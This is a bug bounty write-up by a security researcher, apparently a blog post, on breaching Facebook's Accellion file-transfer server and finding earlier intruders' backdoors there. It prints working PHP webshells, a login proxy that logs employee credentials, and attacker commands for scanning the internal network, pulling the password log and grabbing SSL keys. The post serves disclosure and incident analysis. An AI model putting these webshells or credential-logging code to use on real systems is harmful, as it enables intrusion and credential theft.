---

title: "How I Hacked Facebook, and Found Someone's Backdoor Script"
description: "Bug Bounty Hunting from Pentest View, and How to Find Remote Code Execution and Someone's Backdoor on Facebook Server..."
category: "案例剖析"
tags: ["Facebook", "BugBounty", "RCE", "Backdoor", "Reconnaissance", "Pentest"]
author: "orange"
keywords: "Facebook, BugBounty, RCE, Backdoor, Reconnaissance, Pentest"
image: "/images/blog/20160421/facebook.jpg"
---

by [Orange Tsai](http://blog.orange.tw/)  

[How I Hacked Facebook, and Found Someone's Backdoor Script](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script-eng-ver/) (English Version)  
[滲透 Facebook 的思路與發現](http://devco.re/blog/2016/04/21/how-I-hacked-facebook-and-found-someones-backdoor-script/) (中文版本)  

----------

![Facebook](/images/blog/20160421/facebook.jpg)

----------

### Foreword

As a pentester, I love server-side vulnerabilities more than client-side ones. Why? Because it's way much cooler to take over the server directly and gain system SHELL privileges. <(￣︶￣)>  

Of course, both vulnerabilities from the server-side and the client-side are indispensable in a perfect penetration test. Sometimes, in order to take over the server more elegantly, it also need some client-side vulnerabilities to do the trick. But speaking of finding vulnerabilities, I prefer to find server-side vulnerabilities first.  

With the growing popularity of Facebook around the world, I've always been interested in testing the security of Facebook. Luckily, in 2012, Facebook launched the [Bug Bounty Program](https://www.facebook.com/whitehat/), which even motivated me to give it a shot.  

READMORE

From a pentester's view, I tend to start from recon and do some research. First, I'll determine how large is the "territory" of the company on the internet, then...try to find a nice entrance to get in, for example:  

* What can I find by Google Hacking?  
* How many B Class IP addresses are used? How many C Class IPs?  
* Whois? Reverse Whois?  
* What domain names are used? What are their internal domain names? Then proceed with enumerating sub-domains  
* What are their preferred techniques and equipment vendors?  
* Any data breach on Github or Pastebin?  
* ...etc  


Of course, Bug Bounty is nothing about firing random attacks without restrictions. By comparing your findings with the permitted actions set forth by Bug Bounty, the overlapping part will be the part worth trying.  

Here I'd like to explain some common security problems found in large corporations during pentesting by giving an example.  

 1. For most enterprises, "**Network Boundary**" is a rather difficult part to take care of. When the scale of a company has grown large, there are tens of thousands of routers, servers, computers for the MIS to handle, it's impossible to build up a perfect mechanism of protection. Security attacks can only be defended with general rules, but a successful attack only needs a tiny weak spot. That's why luck is often on the attacker's side: a vulnerable server on the "border" is enough to grant a ticket to the internal network!  
 2. Lack of awareness in "**Networking Equipment**" protection. Most networking equipment doesn't offer delicate SHELL controls and can only be configured on the user interface. Oftentimes the protection of these devices is built on the Network Layer. However, users might not even notice if these devices were compromised by 0-Day or 1-Day attacks.  
 3. Security of people: now we have witnessed the emergence of the "**Breached Database**" (aka "**Social Engineering Database**" in China), these leaked data sometimes makes the penetration difficulty incredibly low. Just connect to the breach database, find a user credential with VPN access...then voilà! You can proceed with penetrating the internal network. This is especially true when the scope of the data breach is so huge that the Key Man's password can be found in the breached data. If this happens, then the security of the victim company will become nothing. :P  
<br>

For sure, when looking for the vulnerabilities on Facebook, I followed the thinking of the penetration tests which I was used to. When I was doing some recon and research, not only did I look up the domain names of Facebook itself, but also tried Reverse Whois. And to my surprise, I found an INTERESTING domain name:  
    
    tfbnw.net

TFBNW seemed to stand for "**TheFacebook Network**"  
Then I found bellow server through public data  

    vpn.tfbnw.net

WOW. When I accessed vpn.tfbnw.net there's the Juniper SSL VPN login interface. But its version seemed to be quite new and there was no vulnerability can be directly exploited...nevertheless, it brought up the beginning of the following story.  

It looked like TFBNW was an internal domain name for Facebook. Let's try to enumerate the C Class IPs of vpn.tfbnw.net and found some interesting servers, for example:  

* Mail Server Outlook Web App  
* F5 BIGIP SSL VPN  
* CISCO ASA SSL VPN  
* Oracle E-Business  
* MobileIron MDM    

From the info of these servers, I thought that these C Class IPs were relatively important for Facebook. Now, the whole story officially starts here.  

----------

### Vulnerability Discovery

I found a special server among these C Class IPs.  

    files.fb.com

![files.fb.com](/images/blog/20160421/1.jpg)
*↑ Login Interface of files.fb.com*

<br>
Judging from the LOGO and Footer, this seems to be Accellion's Secure File Transfer (hereafter known as FTA)  

FTA is a product which enables secure file transfer, online file sharing and syncing, as well as integration with Single Sign-on mechanisms including AD, LDAP and Kerberos. The Enterprise version even supports SSL VPN service.  

Upon seeing this, the first thing I did was searching for publicized exploits on the internet. The latest one was found by HD Moore and made public on this Rapid7’s Advisory  

* [Accellion File Transfer Appliance Vulnerabilities (CVE-2015-2856, CVE-2015-2857)](https://community.rapid7.com/community/metasploit/blog/2015/07/10/r7-2015-08-accellion-file-transfer-appliance-vulnerabilities-cve-2015-2856-cve-2015-2857) 

Whether this vulnerability is exploitable can be determined by the version information leaked from "**/tws/getStatus**". At the time I discovered files.fb.com the defective v0.18 has already been updated to v0.20. But from the fragments of source code mentioned in the Advisory, I felt that with such coding style there should still be security issues remained in FTA if I kept looking. Therefore, I began to look for 0-Day vulnerabilities on FTA products!  

Actually, from black-box testing, I didn't find any possible vulnerabilities, and I had to try white-box testing. After gathering the source codes of previous versions FTA from several resources I could finally proceed with my research!  

The FTA Product  

1. Web-based user interfaces were mainly composed of Perl & PHP  
2. The PHP source codes were encrypted by IonCube  
3. Lots of Perl Daemons in the background  

First I tried to decrypt IonCube encryption. In order to avoid being reviewed by the hackers, a lot of network equipment vendors will encrypt their product source codes. Fortunately, the IonCube version used by FTA was not up to date and could be decrypted with ready-made tools. But I still  had to fix some details, or it's gonna be messy...  

After a simple review, I thought Rapid7 should have already got the easier vulnerabilities. T^T  
And the vulnerabilities which needed to be triggered were not easy to exploit. Therefore I need to look deeper!  

Finally, I found 7 vulnerabilities, including  

* Cross-Site Scripting x 3  
* Pre-Auth SQL Injection leads to Remote Code Execution  
* Known-Secret-Key leads to Remote Code Execution  
* Local Privilege Escalation x 2  

Apart from reporting to Facebook Security Team, other vulnerabilities were submitted to Accellion Support Team in Advisory for their reference. After vendor patched, I also sent these to CERT/CC and they assigned 4 CVEs for these vulnerabilities.

* CVE-2016-2350
* CVE-2016-2351
* CVE-2016-2352
* CVE-2016-2353

More details will be published after full disclosure policy!

![shell on facebook](/images/blog/20160421/2.jpg)
*↑ Using Pre-Auth SQL Injection to Write Webshell*

<br>
After taking control of the server successfully, the first thing is to check whether the server environment is friendly to you. To stay on the server longer, you have to be familiar with the environments, restrictions, logs, etc and try hard not to be detected. :P  

There are some restrictions on the server:  

 1. Firewall outbound connection unavailable, including TCP, UDP, port 53, 80 and 443  
 2. Remote Syslog server  
 3. Auditd logs enabled  

Although the outbound connection was not available, but it looked like ICMP Tunnel was working. Nevertheless, this was only a Bug Bounty Program, we could simply control the server with a webshell.  

----------

### Was There Something Strange?  

While collecting vulnerability details and evidences for reporting to Facebook, I found some strange things on web log.  


First of all I found some strange PHP error messages in "**/var/opt/apache/php\_error\_log**"  
These error messages seemed to be caused by modifying codes online?  

![PHP error log](/images/blog/20160421/3.jpg)
*↑ PHP error log*

<br>
I followed the PHP paths in error messages and ended up with discovering suspicious WEBSHELL files left by previous "visitors".  

![Webshell on facebook server](/images/blog/20160421/4.jpg)
*↑ Webshell on facebook server*

some contents of the files are as follows:  

**sshpass**  
<pre><code>Right, THAT <a href='http://linux.die.net/man/1/sshpass'>sshpass</a></code></pre>
**bN3d10Aw.php**
{% highlight php %}
<?php echo shell_exec($_GET['c']); ?>
{% endhighlight %}

**uploader.php**
{% highlight php %}
<?php move_uploaded_file($_FILES["f]["tmp_name"], basename($_FILES["f"]["name"])); ?>
{% endhighlight %}

**d.php**
{% highlight php %}
<?php include_oncce("/home/seos/courier/remote.inc"); echo decrypt($_GET["c"]); ?>
{% endhighlight %}

**sclient\_user\_class\_standard.inc**
{% highlight php %}
<?php
include_once('sclient_user_class_standard.inc.orig');
$fp = fopen("/home/seos/courier/B3dKe9sQaa0L.log", "a"); 
$retries = 0;
$max_retries = 100; 

// blah blah blah...

fwrite($fp, date("Y-m-d H:i:s T") . ";" . $_SERVER["REMOTE_ADDR"] . ";" . $_SERVER["HTTP_USER_AGENT"] . ";POST=" . http_build_query($_POST) . ";GET=" . http_build_query($_GET) . ";COOKIE=" . http_build_query($_COOKIE) . "\n"); 

// blah blah blah...
{% endhighlight %}

The first few ones were typical PHP one-line backdoor and there's one exception: "**sclient\_user\_class\_standard.inc**"  

In include_once "**sclient\_user\_class\_standard.inc.orig**" was the original PHP app for password verification, and the hacker created a proxy in between to log GET, POST, COOKIE values while some important operations were under way.  

A brief summary, the hacker created a proxy on the credential page to log the credentials of Facebook employees. These logged passwords were stored under web directory for the hacker to use WGET every once in a while  

    wget https://files.fb.com/courier/B3dKe9sQaa0L.log


![logged password](/images/blog/20160421/5.jpg)
*↑ Logged passwords*

<br>

From this info we can see that apart from the logged credentials there were also contents of letters requesting files from FTA, and these logged credentials were rotated regularly (this will be mentioned later, that's kinda cheap...XD)  

And at the time I discovered these, there were around 300 logged credentials dated between February 1st to 7th, from February 1st, mostly "**@fb.com**" and "**@facebook.com**". Upon seeing it I thought it's a pretty serious security incident. In FTA, there were mainly two modes for user login  

 1. Regular users sign up: their password hash were stored in the database and hashed encrypted with SHA256+SALT  
 2. All Facebook employees (@fb.com) used LDAP and authenticated by AD Server  
 
I believe these logged credentials were real passwords and I ****GUESS**** they can access to services such as Mail OWA, VPN for advanced penetration...  

In addition, this hacker might be careless:P   

 1. The backdoor parameters were passed through GET method and his footprinting can be identified easily in from web log  
 2. When the hacker was sending out commands, he didn't take care of STDERR, and left a lot of command error messages in web log which the hacker's operations could be seen  

<br>
From access.log, every few days the hacker will clear all the credentials he logged  
{% highlight prolog %}
192.168.54.13 - - 17955 [Sat, 23 Jan 2016 19:04:10 +0000 | 1453575850] "GET /courier/custom_template/1000/bN3dl0Aw.php?c=./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'cp /home/seos/courier/B3dKe9sQaa0L.log /home/seos/courier/B3dKe9sQaa0L.log.2; echo > /home/seos/courier/B3dKe9sQaa0L.log' 2>/dev/stdout HTTP/1.1" 200 2559 ...
{% endhighlight %}
<br>

Packing files
{% highlight bash %}
cat tmp_list3_2 | while read line; do cp /home/filex2/1000/$line files; done 2>/dev/stdout
tar -czvf files.tar.gz files
{% endhighlight %}
<br>

Enumerating internal network architecture
{% highlight tex %}
dig a archibus.thefacebook.com
telnet archibus.facebook.com 80
curl http://archibus.thefacebook.com/spaceview_facebook/locator/room.php
dig a records.fb.com
telnet records.fb.com 80
telnet records.fb.com 443
wget -O- -q http://192.168.41.16
dig a acme.facebook.com
./sshpass -p '********' ssh -v -o StrictHostKeyChecking=no soggycat@localhost 'for i in $(seq 201 1 255); do for j in $(seq 0 1 255); do echo "192.168.$i.$j:`dig +short ptr $j.$i.168.192.in-addr.arpa`"; done; done' 2>/dev/stdout
...
{% endhighlight %}
<br>

Use ShellScript to scan internal network but forgot to redirect STDERR XD
![Port Scanning](/images/blog/20160421/6.jpg)
<br>

Attempt to connect internal LDAP server  
{% highlight tex %}
sh: -c: line 0: syntax error near unexpected token `('
sh: -c: line 0: `ldapsearch -v -x -H ldaps://ldap.thefacebook.com -b CN=svc-accellion,OU=Service Accounts,DC=thefacebook,DC=com -w '********' -s base (objectclass=*) 2>/dev/stdout'
{% endhighlight %}
<br>

Attempt to access internal server   
(Looked like Mail OWA could be accessed directly...)  
{% highlight text %}
--20:38:09--  https://mail.thefacebook.com/
Resolving mail.thefacebook.com... 192.168.52.37
Connecting to mail.thefacebook.com|192.168.52.37|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://mail.thefacebook.com/owa/ [following]
--20:38:10--  https://mail.thefacebook.com/owa/
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 302 Moved Temporarily
Location: https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0 [following]
--20:38:10--  https://mail.thefacebook.com/owa/auth/logon.aspx?url=https://mail.thefacebook.com/owa/&reason=0
Reusing existing connection to mail.thefacebook.com:443.
HTTP request sent, awaiting response... 200 OK
Length: 8902 (8.7K) [text/html]
Saving to: `STDOUT'

     0K ........                                              100% 1.17G=0s

20:38:10 (1.17 GB/s) - `-' saved [8902/8902]

--20:38:33--  (try:15)  https://10.8.151.47/
Connecting to 10.8.151.47:443... --20:38:51--  https://svn.thefacebook.com/
Resolving svn.thefacebook.com... failed: Name or service not known.
--20:39:03--  https://sb-dev.thefacebook.com/
Resolving sb-dev.thefacebook.com... failed: Name or service not known.
failed: Connection timed out.
Retrying.
{% endhighlight %}
<br>

Attempt to steal SSL Private Key  
{% highlight text %}
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
ls: /etc/opt/apache/ssl.key/server.key: No such file or directory
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
mv: cannot stat `x': No such file or directory
sh: /etc/opt/apache/ssl.crt/server.crt: Permission denied
base64: invalid input
{% endhighlight %}
<br>

After checking the browser, the SSL certificate of files.fb.com was *.fb.com ...  

![certificate of files.fb.com](/images/blog/20160421/7.jpg)

----------


### Epilogue

After adequate proofs had been collected, they were immediately reported to Facebook Security Team. Other than vulnerability details accompanying logs, screenshots and timelines were also submitted xD  

Also, from the log on the server, there were two periods that the system was obviously operated by the hacker, one in the beginning of July and one in mid-September  

the July one seemed to be a server "dorking" and the September one seemed more vicious. Other than server "dorking" keyloggers were also implemented. As for the identities of these two hackers, were they the same person? Your guess is as good as mine. :P  
The time July incident happened to take place right before the announcement of CVE-2015-2857 exploit. Whether it was an invasion of 1-day exploitation or unknown 0-day ones were left in question.  

<br>

Here's the end of the story, and, generally speaking, it was a rather interesting experience xD  
Thanks to this event, it inspired me to write some articles about penetration :P  

Last but not least, I would like to thank Bug Bounty and tolerant Facebook Security Team so that I could fully write down this incident : )  

<br>

----------


## Timeline

* 2016/02/05 20:05 Provide vulnerability details to Facebook Security Team
* 2016/02/05 20:08 Receive automatic response
* 2016/02/06 05:21 Submit vulnerability Advisory to Accellion Support Team
* 2016/02/06 07:42 Receive response from Thomas that inspection is in progress
* 2016/02/13 07:43 Receive response from Reginaldo about receiving Bug Bounty award $10000 USD
* 2016/02/13 Asking if there anything I should pay special attention to in blog post ?
* 2016/02/13 Asking Is this vulnerability be classify as a RCE or SQL Injection ?
* 2016/02/18 Receive response from Reginaldo about there is a forensics investigation, Would you be able to hold your blog post until this process is complete? 
* 2016/02/24 Receive response from Hai about the bounty will include in March payments cycle. 
* 2016/04/20 Receive response from Reginaldo about the forensics investigation is done


